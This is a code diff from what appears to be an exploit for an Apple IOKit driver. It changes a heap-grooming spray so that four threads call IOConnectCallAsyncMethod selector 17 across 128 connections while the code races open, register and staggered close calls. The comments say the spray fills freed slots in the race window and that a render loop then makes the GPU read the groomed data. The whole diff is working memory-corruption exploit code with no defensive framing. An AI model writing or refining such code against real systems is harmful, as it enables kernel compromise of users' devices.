@@ -1410,6 +1410,27 @@ static void p13_groom_fake(uint64_t addr, uint64_t val, int inSz) {
     }
 }
 
+/* Phase 16 concurrent groom spray thread */
+static volatile int p16_groom_run = 0;
+static io_connect_t *p16_groom_conns = NULL;
+static mach_port_t *p16_groom_wps = NULL;
+static int p16_groom_n = 0;
+static uint64_t *p16_groom_data = NULL;
+static volatile uint64_t p16_groom_count = 0;
+
+static void *p16_groom_spray(void *arg) {
+    (void)arg;
+    while (p16_groom_run) {
+        for (int g = 0; g < p16_groom_n && p16_groom_run; g++) {
+            uint64_t gref = 0xBB00000000000000ULL | __sync_fetch_and_add(&p16_groom_count, 1);
+            IOConnectCallAsyncMethod(p16_groom_conns[g], 17,
+                p16_groom_wps[g], &gref, 1, NULL, 0,
+                p16_groom_data, 24, NULL, NULL, NULL, NULL);
+        }
+    }
+    return NULL;
+}
+
 static void *worker_thread(void *arg) {
     (void)arg;
     int argc = g_main_argc;
@@ -19818,9 +19839,7 @@ new_modes:
 
             uint64_t inp16[3] = {1, 2, 3};
 
-            /* Pre-open groom connections ONCE (before any race).
-             * This way the groom spray is just sel17 calls — no slow IOServiceOpen.
-             * Also pre-allocate wake ports for speed. */
+            /* Pre-open groom connections for concurrent spray */
             #define GROOM16_CONNS 128
             io_connect_t groom_cs16[GROOM16_CONNS];
             mach_port_t groom_wp16[GROOM16_CONNS];
@@ -19840,8 +19859,25 @@ new_modes:
                 rlog("  Pre-opened %d groom connections\n", groom_n16);
             }
 
+            /* Set up concurrent groom state */
+            p16_groom_conns = groom_cs16;
+            p16_groom_wps = groom_wp16;
+            p16_groom_n = groom_n16;
+            p16_groom_data = g16;
+
             for (int iter = 0; iter < 10; iter++) {
-                /* ---- STEP 1: Race WITHOUT render loop ---- */
+                /* ---- Start CONCURRENT groom spray BEFORE race ---- */
+                #define GROOM16_THREADS 4
+                pthread_t groom_ths[GROOM16_THREADS];
+                p16_groom_count = 0;
+                if (rounds <= 163) {
+                    p16_groom_run = 1;
+                    for (int t = 0; t < GROOM16_THREADS; t++)
+                        pthread_create(&groom_ths[t], NULL, p16_groom_spray, NULL);
+                    usleep(1000); /* let groom threads warm up 1ms */
+                }
+
+                /* ---- Race: open + register + close ---- */
                 io_connect_t cs16[8];
                 int have16[8];
                 for (int i = 0; i < 8; i++) {
@@ -19865,7 +19901,7 @@ new_modes:
                 for (int t = 0; t < 16; t++)
                     pthread_create(&spam16[t], NULL, p13_spam_reg, NULL);
 
-                /* Stagger close — race window */
+                /* Stagger close — race window (groom spray running!) */
                 for (int i = 7; i >= 0; i--) {
                     if (have16[i]) { IOServiceClose(cs16[i]); have16[i] = 0; }
                     usleep(100);
@@ -19875,24 +19911,19 @@ new_modes:
                 for (int t = 0; t < 16; t++) pthread_join(spam16[t], NULL);
                 for (int i = 0; i < 8; i++) if (have16[i]) IOServiceClose(cs16[i]);
 
-                rlog("  [%d] race done, spam=%llu\n", iter,
-                     (unsigned long long)p13_spam_count);
+                /* Let groom spray continue 2ms after race to fill freed slots */
+                usleep(2000);
 
-                /* ---- STEP 2: FAST groom spray (sel17 on pre-opened conns) ---- */
-                /* Only sel17 calls here — connections already open.
-                 * Must be faster than compositor frame (~8ms). */
-                int groom_sent = 0;
+                /* Stop groom spray */
                 if (rounds <= 163) {
-                    for (int g = 0; g < groom_n16; g++) {
-                        uint64_t gref = 0xAA00000000000000ULL | (iter << 8) | g;
-                        IOConnectCallAsyncMethod(groom_cs16[g], 17,
-                            groom_wp16[g], &gref, 1, NULL, 0,
-                            g16, 24, NULL, NULL, NULL, NULL);
-                        groom_sent++;
-                    }
+                    p16_groom_run = 0;
+                    for (int t = 0; t < GROOM16_THREADS; t++)
+                        pthread_join(groom_ths[t], NULL);
                 }
 
-                rlog("  [%d] groom sent=%d (fast sel17)\n", iter, groom_sent);
+                rlog("  [%d] race spam=%llu groom=%llu\n", iter,
+                     (unsigned long long)p13_spam_count,
+                     (unsigned long long)p16_groom_count);
 
                 /* ---- STEP 3: Start render loop → GPU reads groomed data ---- */
                 int did_render = (rounds != 164);
